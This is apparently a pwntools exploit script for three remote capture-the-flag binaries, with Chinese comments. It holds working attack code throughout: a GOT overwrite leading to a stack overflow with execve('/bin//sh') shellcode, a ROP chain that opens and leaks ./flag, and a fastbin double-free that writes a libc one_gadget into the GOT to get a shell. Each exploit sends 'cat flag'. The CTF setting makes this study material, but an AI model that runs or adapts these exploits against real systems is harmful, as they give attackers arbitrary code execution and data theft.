from pwn import *
import warnings

warnings.filterwarnings("ignore")
context.timeout=3

def exp1(server,port):
    p = remote(server, port)
    # p = process("./one")
    p.recvuntil(b"= ")
    main = p.recvuntil(b" and")[:-4]
    main = int(main, 16)
    base_process = main - 0x13B8
    exit_addr = base_process + 0x4050
    target = base_process + 0x12A0

    p.recvuntil(b"=  ")

    stack = p.recvuntil(b"\n")[:-1]
    stack = int(stack, 16)
    print(hex(base_process))
    print(hex(stack))
    # attach(p)
    # 第一次，改exit的got到libc_main_start,死循环
    p.sendlineafter(b"What address you want to write?", hex(exit_addr))
    p.sendlineafter(b"What value you want to write?", str(240))
    p.sendlineafter(b"What address you want to modify?", hex(base_process + 0x1000))

    # 第二次修改read的大小，变成栈溢出
    p.sendlineafter(b"What address you want to write?", hex(target))
    p.sendlineafter(b"What value you want to write?", str(0xAA))

    shell = b'H1\xf6VH\xbf/bin//shWT_\xb0;\x99\x0f\x05'
    payload = (hex((stack // 0x1000) * 0x1000).encode() + b'\x00').ljust(0x20, b'a') + p64(stack - 1000) + p64(
        stack + 0x7ffe8f0733f0 - 0x7ffe8f07351c) + shell
    # attach(p)
    p.sendlineafter(b"What address you want to modify?", payload)

    p.sendline(b"cat flag")
    return p


def exp2(server, port):
    elf = ELF('rop')
    p = remote(server, port)
    # p=process('./rop')
    exit_got = elf.got['_exit']
    open_plt = 0x000000000401100
    read_plt = 0x0000000004010D0
    write_plt = 0x004010C0
    pop_rdi_ret = 0x0000000000401483
    pop_rsi_r15_ret = 0x0000000000401481
    pop_rbp_ret = 0x00000000004011fd

    p.sendlineafter("your choice:", b'4919')
    payload = b'a' * 256 + p64(0x000000000404060 + 0x100 + 0x500 + 8) + p64(0x000000000401304)
    sleep(1)
    p.send(payload)

    sleep(1)
    # attach(p)
    # 起始于0x000000000404060+0x100+0x500+8
    payload = (p64(pop_rdi_ret) + p64(0x000000000404060 + 0x100 + 0x500 + 8 - 104) + p64(pop_rsi_r15_ret) + p64(
        4) + p64(0) +
               p64(open_plt) + p64(pop_rbp_ret) + p64(4212328 + 0x70 - 0x100 - 0x30) + p64(0x000000000401304) +
               p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_r15_ret) + p64(0x000000000404060) + p64(0) +
               p64(read_plt) + p64(pop_rdi_ret) + p64(1) + p64(write_plt) + p64(0x00000000040139C) + b'./flag\x00r\x00'
               ).ljust(256, b'a') + p64(0x000000000404060 + 0x500) + p64(0x000000000401304)
    # 0x100
    p.send(payload)
    # 跳转到0x000000000404060+0x500
    sleep(1)
    p.send(b'lalala')

    sleep(1)
    p.send(b'lalala')
    return p

def exp3(server, port):
    p = remote(server, port)
    libc = ELF('libc-2.23.so')

    def add(size, name, kind):
        p.sendlineafter("Your choice : ", b'1', timeout=1)
        p.sendlineafter("Length of the name :", str(size))
        p.sendafter("The name of animal :", name)  # buf
        p.sendlineafter("The kind of the animal :", kind)  # scanf

    def dele(num):
        p.sendlineafter("Your choice : ", b'3')
        p.sendlineafter("Which animal do you want to remove from the cage:", str(num))

    def show():
        p.sendlineafter("Your choice : ", b'2')

    # attach(p)
    add(0x58, b'heshi', b'1')
    add(0x58, b'heshi', b'1')

    dele(0)
    dele(1)
    dele(0)

    add(0x58, p64(0x000000000602018 - 0x10 - 14), b'1')  # 可修改的内容在这个地址后16字节
    add(0x58, b'0', b'1')
    add(0x58, b'0', b'1')
    add(0x58, b'0' * 14, b'1')

    show()

    libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['free']
    print(hex(libc_base))
    one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
    one_gadget = libc_base + one[1]

    dele(3)
    dele(4)
    dele(3)

    add(0x58, p64(0x000000000602018 - 0x10 - 14), b'1')  # 可修改的内容在这个地址后16字节
    add(0x58, b'0', b'1')
    add(0x58, b'0', b'1')
    # attach(p)
    add(0x58, b'0' * 22 + p64(one_gadget), b'1')

    p.sendline(b"cat flag")
    return p
